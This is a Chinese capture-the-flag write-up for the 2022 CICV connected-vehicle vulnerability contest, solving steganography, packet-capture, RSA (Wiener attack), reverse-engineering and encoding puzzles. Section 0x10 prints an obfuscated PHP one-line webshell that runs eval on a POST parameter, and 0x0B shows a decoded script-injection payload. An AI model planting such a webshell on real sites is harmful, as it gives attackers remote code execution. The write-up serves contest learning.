# 2022 CICV智能网联汽车漏洞挖掘赛Writeup–BinX4

<div class="has-toc have-toc">
</div>

## 0x00 仔细看图片

图片用010打开发现有PK，也就是说包含压缩包，用foremost解出来，解压得到两个png文件，但其实都是zip。<figure class="wp-block-image size-full">

<img loading="lazy" width="920" height="111" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/04/图片-49.png" alt="" class="wp-image-5465" /> </figure> 

flag3有密码，flag1解压得到hint，密码是4位，爆破得到6666，解压得到realflag的图片，使用stegsolve查看发现是lsb隐写。<figure class="wp-block-image size-full">

<img loading="lazy" width="1441" height="1026" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/04/图片-50.png" alt="" class="wp-image-5467" /> </figure> 

## 0x01 图片仔细看

补文件头，ocr识别flag。<figure class="wp-block-image size-full">

<img loading="lazy" width="1318" height="238" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/04/图片-51.png" alt="" class="wp-image-5468" /> </figure> 

## 0x02 简单的流量分析

在pcapang导出secret.png，可以发现密码是9527。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/04/图片-52.png" alt="" class="wp-image-5470" width="291" height="348" /> </figure> 

拼接二维码，得到`BASE Family Bucket ??? 85->64->85->16->32`<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/04/图片-53.png" alt="" class="wp-image-5471" width="369" height="358" /> </figure> 

将编码后的flag反着顺序解即可。

```
GM4TMRBUII3EMMZVGM4TIQJUIMZTGNBZGQYDGOBWGY3DCMZSGNBTINJTGI2DANKGGNBTKRJXGEZDKMRUGM4TMOJUIY2TGNZRGQYDKMRVHEZTMMRWGQYDKNRUII3DINKDGNBTMMRWGIZTMMRSGM4DKMZXGE2DAMSGGM4TMOJWIIZDQNJVGM4TIRJTIU2TGNCBGM4TKMBVIIZECNRZGNBTIOBWG42TGNRY
```

## 0x03 解析音频

slienteye导出flag.txt

<pre class="wp-block-code"><code>U2FsdGVkX1/ZEFKooGZ4A22yxGmim1eB4vd9WpPhd//5+gaGmmntCgvb1GRoIVyc</code></pre>

RC4.txt里面的内容是社会核心价值观编码，解码得到`!@#$123`

<pre class="wp-block-code"><code>文明民主自由富强文明和谐文明自由和谐民主和谐文明和谐和谐</code></pre>

在<a rel="noreferrer noopener" href="http://tools.jb51.net/password/rc4_encode" target="_blank" rel="nofollow" >http://tools.jb51.net/password/rc4_encode</a>进行解码即可得到flag。

## 0x04 ECU里的秘密2

```python
from secret import flag
from Crypto.Util.number import *


def str_to_num(s):
    hex_str = ""
    for i in s:
        hex_str += str(hex(ord(i))).lstrip("0x")

    hex_str = "0x" + hex_str
    return int(hex_str, 16)


m = str_to_num(flag)

p = getPrime(512)
q = getPrime(512)
N = p * q
phi = (p - 1) * (q - 1)
while True:
    d = getRandomNBitInteger(200)
    if GCD(d, phi) == 1:
        e = inverse(d, phi)
        break

c = pow(m, e, N)

print(c, e, N, sep='\n')

# 96584061026622286545063291472705181084679814412466522587332144648224314426683416287931941578413761077731726929424331173278337209260050307977205606452443160420855302024555391000793908017297496869820804390143456078669337507653382366071312278105951084198007936575990063383671858795989636957929380428362598898072
# 11740351751510047446998714931350993714396628211280864776110365123347173396583484316711458774029527500611296039150039564763614020683799796903523006439087198226393520091053520335273342829170104532491355478575580428692888260006028265274689967321629212892513652812670695278373844528403181961613120252670745571053
# 123438036035406535460511166374496077384102026741092288198344700861685906636796768225396940612586706260451017163138041088510652554400234468565585667747104196712115968244305594612024378291259754742916440514116686940788878250978559510464853412265657110705149547843302525328641075595384934547819346900278850047889
```

e很大，明显是维纳攻击

```python
import  RSAwienerHacker
import hashlib
from Crypto.Util.number import *
e= 11740351751510047446998714931350993714396628211280864776110365123347173396583484316711458774029527500611296039150039564763614020683799796903523006439087198226393520091053520335273342829170104532491355478575580428692888260006028265274689967321629212892513652812670695278373844528403181961613120252670745571053
n= 123438036035406535460511166374496077384102026741092288198344700861685906636796768225396940612586706260451017163138041088510652554400234468565585667747104196712115968244305594612024378291259754742916440514116686940788878250978559510464853412265657110705149547843302525328641075595384934547819346900278850047889
c = 96584061026622286545063291472705181084679814412466522587332144648224314426683416287931941578413761077731726929424331173278337209260050307977205606452443160420855302024555391000793908017297496869820804390143456078669337507653382366071312278105951084198007936575990063383671858795989636957929380428362598898072

d =  RSAwienerHacker.hack_RSA(e,n)
m = pow(c,d,n)

flag = long_to_bytes(m)
print flag
```

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/04/图片-54.png" alt="" class="wp-image-5473" width="543" height="54" /> </figure> 

## 0x05 细心

改后缀名为zip，解压在media里面看到一个可疑的二维码，扫描得到flag。<figure class="wp-block-image size-full">

<img loading="lazy" width="1629" height="543" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/04/图片-55.png" alt="" class="wp-image-5474" /> </figure> 

## 0x06 眼见为实吗？

改后缀名为zip，在word/document.xml发现flag<figure class="wp-block-image size-full">

<img loading="lazy" width="2002" height="950" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/04/图片-56.png" alt="" class="wp-image-5475" /> </figure> 

## 0x07 图片不见了

根据wsxdrfvtgbuhb85799zsedcftgb猜测是键盘密码，wv85799m，解压得到一张图片，010打开在文件尾部发现flag。

## 0x08 不要乱安装运行文件

用ig搜索目录下的flag字符串<figure class="wp-block-image size-full">

<img loading="lazy" width="139" height="24" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/05/图片.png" alt="" class="wp-image-5478" /> </figure> 

搜到两个flag，由于其中一个flag和前面的题目重复了，所以只需要提交另一个就可以。<figure class="wp-block-image size-full">

<img loading="lazy" width="353" height="56" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/05/图片-2.png" alt="" class="wp-image-5480" /></figure> 

## 0x09 这是一个控车说明文档吗？

分析判断doc文件实为rar，且存在密码，拿到<a rel="noreferrer noopener" href="https://www.lostmypass.com/" target="_blank" rel="nofollow" >LostMyPass</a>网站上跑密码，得到123456。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/05/图片-3.png" alt="" class="wp-image-5481" width="594" height="402" /> </figure> 

解压得到flag。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/05/图片-4.png" alt="" class="wp-image-5482" width="167" height="80" /> </figure> 

## 0x0A 串口的秘密

1.Enter Serial 函数定位关键函数sub_400D48

2.Ida 反汇编进入函数 sub_400D48

3.使if 判断不成立<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/05/图片-5.png" alt="" class="wp-image-5483" width="663" height="522" /> </figure> 

得出字符串 a 为 a = ['T', 'z', 'e', 'y', '7', '-', 'd', 'r', 'F', 'L', 'T', '-', 'c', 't', 'f', 'g', 'H', '5', '-', 'p', 'u', 'T', 'F', '6', 'Y']

v9与字符串a异或更新 v9的值<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/05/图片-6.png" alt="" class="wp-image-5484" width="708" height="331" /> </figure> 

解密脚本

<pre class="wp-block-code"><code>a = &#91;'T', 'z', 'e', 'y', '7', '-', 'd', 'r', 'F', 'L', 'T', '-',\
     'c', 't', 'f', 'g', 'H', '5', '-', 'p', 'u', 'T', 'F', '6', 'Y']
v1 = &#91;0]*4

v1&#91;0] = b'\xFE\xC4\xA6\xF9\xE4\xF8\xB1\xD9'
v1&#91;1] = b'\xD2\xAB\xA6\xF0\xE6\x9A\xC1\x8A'
v1&#91;2] = b'\x9D\xDA\xC0\xE9\xFB\xEA\x82\xF5'
v1&#91;3] = b'\xCC'

b = v1&#91;0]&#91;::-1]+v1&#91;1]&#91;::-1]+v1&#91;2]&#91;::-1]+v1&#91;3]
b = list(b)
c = &#91;0]*25

for i in range(len(a)):
    c&#91;i] = ord(a&#91;i])^ (~(b&#91;i])%256)

print(''.join(chr(i) for i in c))</code></pre>

## 0x0B 文件加解密

Key.html 提取flag值<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/05/图片-7.png" alt="" class="wp-image-5485" width="804" height="222" /> </figure> 

Hex解密得 jsfuck代码<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/05/图片-8.png" alt="" class="wp-image-5486" width="662" height="507" /> </figure> 

Jsfuck解密得到 js代码<figure class="wp-block-image size-full">

<img loading="lazy" width="1698" height="1237" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/05/图片-14.png" alt="" class="wp-image-5492" width="806" height="287" /></figure> 

Base64解密`PHNyY2lwdD5hbGVydCgiZmxhZ3s2NmI4YzRkMDFjMzI2NDljZTZkMzU0NzkwMTg5OGE4NX0iKTwvc2NyaXB0Pg`得`<srcipt>alert("flag{66b8c4d01c32649ce6d3547901898a85}")</script>`

## 0x0C 控车密码完了

Jeb反编译apk文件，定位如下关键代码，找到相应字符串，编码解出flag<figure class="wp-block-image size-full">

<img loading="lazy" width="1466" height="1558" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/05/图片-17.png" alt="" class="wp-image-5495" width="578" height="441" /></figure> 

## 0x0D 最长的套路

树的直径（最长路径）证明：<a href="https://www.cnblogs.com/wuyiqi/archive/2012/04/08/2437424.html" target="_blank"  rel="nofollow" >https://www.cnblogs.com/wuyiqi/archive/2012/04/08/2437424.html</a>

<pre class="wp-block-code"><code>#处理html部分
from bs4 import BeautifulSoup
from collections import deque
import re

with open("Maze.html", "r") as file:
    html_doc = file.read()
soup = BeautifulSoup(html_doc, 'html.parser')
lattice = soup.find_all('td')
pattern = re.compile(r'border-(&#91;a-z]+):')
maze = &#91;]
for j in range(100):
    temp1 = &#91;]
    for i in range(j * 100, j * 100 + 100):
        temp = ""
        result = pattern.findall(str(lattice&#91;i]))
        print(result)
        if 'top' not in result:
            temp += "u"
        if 'bottom' not in result:
            temp += "d"
        if 'right' not in result:
            temp += "r"
        if 'left' not in result:
            temp += "l"
        temp1.append(temp)
    maze.append(temp1)

move = {'u': (-1, 0), 'd': (1, 0), 'l': (0, -1), 'r': (0, 1)}
queue = deque()
queue.append(((70,22), 0))
visited = &#91;]
ans = 0
ansv = ()
while queue:
    v, res = queue.popleft()
    if res &gt; ans:
        ans = res
        ansv = v
    if v not in visited:
        visited.append(v)
        for adj in maze&#91;v&#91;0]]&#91;v&#91;1]]:
            queue.append(((v&#91;0] + move&#91;adj]&#91;0], v&#91;1] + move&#91;adj]&#91;1]), res + 1))
print(ansv, ans)</code></pre>

结果最长路径为4056<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/05/图片-18.png" alt="" class="wp-image-5497" width="605" height="273" /> </figure> 

## 0x0E 签到2

根据图片中信号格式，可以看出这是一个UART协议的信号，根据UART协议的说明，我们可以将信号分为1位低电平起始位，8位数据位和1位高电平停止位，由此把数据分成若干组，如下图记录。<figure class="wp-block-image size-full">

<img loading="lazy" width="554" height="489" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/05/图片-19.png" alt="" class="wp-image-5498" /> <figcaption>、</figcaption></figure> 

连接起来便是一串数字，经过数据翻转和二进制转换后，可以得到flag。

```
01100110001101101000011011100110110111100001110001000110110011001000011011000110111011000110110000101100011001101001110010101100111011000001110010011100011011000100110010100110110001100000110000011100001011001000011001001100001011001100011001000110110001101001110010001100101001101010011010011100101111101011000001010000
```

## 0x0F wav音频的故事2

下载音频后，可以放进audacity中进行观察，发现这段音频每隔几秒会有一段数据，看频谱图可以发现这段数据有的存在红线，而有的没有红线。可以猜测这可能是一个摩斯密码，频谱的红线用来区分.和-，因此可以把密码记录下来。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/05/图片-21.png" alt="" class="wp-image-5500" width="591" height="190" /></figure> 

```
-----.- ----. ..... ....- ...-- ---.. ..--- .- -.... -.. -.-. -.-. ..-. --... -.. --... .- ----. ----. ...-- ..... .---- ..--- .---- ..... ....- -.... --... ..--- -.-. -.. .---- ..-. ----.-- --. .- .-.. ..-.
```

解密码，但是翻转一下就得到flag。

## 0x10 web网站被黑了

下载文件发现是个PHP，里面有很多字符，转换发现这是个一句话木马，里面的连接密码是a，a加密md5为flag。

```
<script langukeye=php>
$_1=chr(97).chr(115).chr(115).chr(101).chr(114).chr(116);
@$_1(chr(64).chr(101).chr(118).chr(97).chr(108).chr(40).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(91).chr(97).chr(93).chr(41).chr(59));
</script>
```


## 0x11 图片不见了

观察流量包，试着导出HTTP对象，发现一个奇怪的文件。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/05/图片-22.png" alt="" class="wp-image-5501" width="605" height="441" /> </figure> 

追踪这个流量可以发现百度网盘的资源地址，<a href="https://pan.baidu.com/s/1TV3hZK5kqLx3uxcYn0EyMw?pwd=7p61" target="_blank"  rel="nofollow" >https://pan.baidu.com/s/1TV3hZK5kqLx3uxcYn0EyMw?pwd=7p61</a>，下载后得到一张知乎图片，丢进Stegsolve，检查LSB隐写的时候可以发现nslookup，md5加密为flag。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/05/图片-23.png" alt="" class="wp-image-5502" width="598" height="461" /> </figure> 

## 0x12 补个成绩

纯纯靠车神的案例带飞，又是摆烂的一天。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/05/图片-25.png" alt="" class="wp-image-5513" width="559" height="243" /> </figure>
